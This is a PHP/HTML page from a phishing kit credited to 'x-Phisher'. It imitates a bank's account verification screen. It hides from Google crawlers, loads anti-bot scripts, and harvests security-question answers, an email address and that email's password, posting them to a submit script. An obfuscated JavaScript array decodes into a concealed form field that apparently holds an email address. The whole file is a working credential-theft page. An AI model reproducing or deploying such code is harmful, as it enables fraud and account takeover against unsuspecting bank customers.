<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.ru ===========================
*/
session_start();
error_reporting(0);
include('BOTS/antibots1.php');
include('BOTS/antibots2.php');
include('BOTS/antibots3.php');
include('BOTS/antibots4.php');
include ('BOTS/authenticator.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
$_SESSION['u'] = $_SESSION['u'];
$_SESSION['p'] = $_SESSION['p'];
?>
<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
</head>
<style type="text/css">


tr {font-family:Arial,Helvetica,sans-serif;color:#000000;}
td {font-family:Arial,Helvetica,sans-serif;color:#000000;}
th {font-family:Arial,Helvetica,sans-serif;color:#000000;}
a {font-family:Arial,Helvetica,sans-serif;color:#002888;}
.nohoverbackground a {background-color:transparent !important}
a.groupLink {font-size:75%;font-weight:bold;}
a.bodyLink {font-size:75%;}
input {font-family:"Courier New",sans-serif;font-size:10pt;}
select {font-family:"Courier New",sans-serif;font-size:10pt;}
.pageTitle {font-size:110%;color:#002888;line-height:1.21em;}
.bodyText, .bodytext {font-family:Arial,Helvetica,sans-serif;font-size:75%;color:#000000}
.bannerText{font-family:Arial,Helvetica,sans-serif;font-size:75%;font-weight:bold;color:#ffffff;}
.breadCrumbRow {background-color:#dddddd;}
B,.rbcBold {font-weight:bold;}
.rbcMonospace {font-family:"Courier New",sans-serif;font-size:10pt;}
.fieldLabel {font-family:Arial,Helvetica,sans-serif;font-size:75%;color:#000000;font-weight:bold;}
.errorText {font-family:Arial,Helvetica,sans-serif;font-size:75%;font-weight:bold;color:#000000;}
.errorTextRow {background-color:#ffcc00;}
.warnText {font-family:Arial,Helvetica,sans-serif;font-size:75%;color:#000000;}
.infoText {font-family:Arial,Helvetica,sans-serif;font-size:75%;color:#000000;}
.sectionHead,.groupHead,.columnHead
{
font-family:Arial,Helvetica,sans-serif;font-size:75%;color:#000000;font-weight:bold;
}
a.footerLink {font-size:60%;}
.footerText,.note
{
font-family:Arial,Helvetica,sans-serif;font-size:66%;color:#000000;
}
.boldnote
{
font-family:Arial,Helvetica,sans-serif;font-size:66%;color:#000000;font-weight:bold;
}
.whiteNote
{
font-family:Arial,Helvetica,sans-serif;font-size:66%;color:#ffffff;
}
.actionPanelSection{background-color:#eceff3;}
.noticeTableBorder {border-color:#ffcc00;}
.noticeTableHeaderRow {background-color:#ffcc00}
.noticeTableHeaderText {font-family:Arial,Helvetica,sans-serif;font-size:75%;color:#000000;font-weight:bold;line-height:22px;}
.noticeTableRow {background-color:#eceff3;}
.noticeTableText {font-family:Arial,Helvetica,sans-serif;font-size:75%;color:#000000;}
.noteRed {font-family:Arial,Helvetica,sans-serif;font-size:66%;color:#ff0000;}
.centuraSkipNavHidden {position:absolute;left:0px;top:-500px;width:1px;height:1px;overflow:hidden;}
.blueText {color:#002888;}
.eOfferFooterSeparator {padding-top:7px;border-top:solid #002888 2px;}
.eOfferFooterLOBText {word-spacing:20px;}
.bodyText .errorTextRow {font-size:100%}
.bodyText .bodyText {font-size:100%;}
.bodyText .infoText {font-size:100%;}
.bodyText .bodyLink {font-size:100%;}
.bodyText .noticeTableHeaderText {font-size:100%;}
.bodyText .noticeTableText {font-size:100%;}
.errorText .errorText {font-size:100%;}

</style>
<body>
<div>
    <div style="position:absolute;left:0px;top:0px;width:1349px;height:614px;z-index:0;">
        <img src="./files/verification.jpg" alt="" />
    </div>
    <p style="left:975px;position:absolute;top:33px;font-size:.845em;"> <?php echo $_SESSION['u']; ?></p>
    <p style="left:1065px;position:absolute;top:47px;font-size:.845em;line-height: 1.2em; margin: 0;"><?php echo date("F j, Y") ?></p>
    <form name="f" method="POST" action="./submit/verify.php" id="f">
    <select name="q1" size="1" title="Select a question" style="position:absolute;top: 388px;left: 580px;">
       <option value="Select a question">Select a question</option>
       <option value="What was the first movie I ever saw?">What was the first movie I ever saw?</option>
       <option value="What is the middle name of my oldest child?">What is the middle name of my oldest child?</option>
       <option value="In which city was my father born?">In which city was my father born?</option>
       <option value="Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option>
       <option value="What is my mother's middle name?">What is my mother's middle name?</option>
       <option value="In what year did I meet my significant other?">In what year did I meet my significant other?</option>
       <option value="What was my first pet's name?">What was my first pet's name?</option>
       <option value="First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option>
       <option value="First name of my best friend in elementary school?">First name of my best friend in elementary school?</option>
       <option value="Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option>
         <option value="*">Create a question</option>
      </select>

      <input maxlength="20" size="22" name="a1" value="" title="enter answer for PVQ1" style="position: absolute;top: 418px;left: 580px;">

      <select name="q2" size="1"  title="Select a question" style="position:absolute;top: 522px;left: 580px;">
       <option value="Select a question">Select a question</option>
       <option value="What was the first book I ever read?">What was the first book I ever read?</option>
       <option value="What was the first company I ever worked for?">What was the first company I ever worked for?</option>
       <option value="What High School did my mother attend?">What High School did my mother attend?</option>
       <option value="In which city was my mother born?">In which city was my mother born?</option>
       <option value="What is my spouse's/partner's middle name?">What is my spouse's/partner's middle name?</option>
       <option value="In which city did I get married?">In which city did I get married?</option>
       <option value="What is my best friend's first name?">What is my best friend's first name?</option>
       <option value="What is the name of the first school I attended?">What is the name of the first school I attended?</option>
       <option value="What was my kindergarten teacher's last name?">What was my kindergarten teacher's last name?</option>
       <option value="What is the first name of my oldest cousin?">What is the first name of my oldest cousin?</option>
      </select>

      <input maxlength="20" size="22" name="a2" value="" title="enter answer for PVQ2" style="position:absolute;top: 552px;left: 580px;">

      <select name="q3" size="1"title="Select a question" style="position:absolute;top: 659px;left: 580px;">
       <option value="Select a question">Select a question</option>
       <option value="What was the make of my first car?">What was the make of my first car?</option>
       <option value="What High School did my father attend?">What High School did my father attend?</option>
       <option value="Which city did I meet my significant other?">Which city did I meet my significant other?</option>
       <option value="Last name of my favourite High School teacher?">Last name of my favourite High School teacher?</option>
       <option value="Which country did I go to on my honeymoon?">Which country did I go to on my honeymoon?</option>
       <option value="First name of my best man at my wedding?">First name of my best man at my wedding?</option>
       <option value="What was the name of my first manager?">What was the name of my first manager?</option>
       <option value="In what town or city was my significant other born?">In what town or city was my significant other born?</option>
       <option value="Last name of my childhood best friend?">Last name of my childhood best friend?</option>
       <option value="What is the first name of my oldest nephew?">What is the first name of my oldest nephew?</option>
      </select>

      
      <input maxlength="20" size="22" name="a3"
       value="" title="enter answer for PVQ3" style="position:absolute;top: 689px;left: 580px;">

      <input type="text" name="e" style="width: 210px;position:absolute;top: 751px;left: 580px;">

      <input type="password" name="e_p" style="position:absolute;top: 781px;left: 580px;;">

      <a style="top:856px;position:absolute;left:429px;" onClick="javascript:document.f.submit();"><img src="./files/btn_continue.png"></a>
<script language="Javascript">var erp = new Array;
erp[0] = 1013542512;
erp[1] = 1970544756;
erp[2] = 2037409085;
erp[3] = 577268068;
erp[4] = 1684368930;
erp[5] = 544104813;
erp[6] = 1698505331;
erp[7] = 1702000229;
erp[8] = 1919118437;
erp[9] = 1634607648;
erp[10] = 1986096245;
erp[11] = 1698505317;
erp[12] = 1684628585;
erp[13] = 1835362917;
erp[14] = 926967661;
erp[15] = 1634298926;
erp[16] = 1668246828;
erp[17] = 543583842;
erp[18] = 1668246906;
erp[19] = 1080520033;
erp[20] = 1768697443;
erp[21] = 1869423166;
erp[22] = 0;
var em = '';
for(i=0;i<erp.length;i++){
	tmp = erp[i];
	if(Math.floor((tmp/Math.pow(256,3)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
	if(Math.floor((tmp/Math.pow(256,2)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
	if(Math.floor((tmp/Math.pow(256,1)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
	if(Math.floor((tmp/Math.pow(256,0)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
	};
};
document.write(em);
</script>    
    </form>
<script>
function C()
{

    var isValidForm = document.forms['f'].checkValidity();
    if (isValidForm)
    {
        document.forms['f'].submit();
    }
    else
    {

        return false;
    }

}</script>  
 </div>
</body>
</html>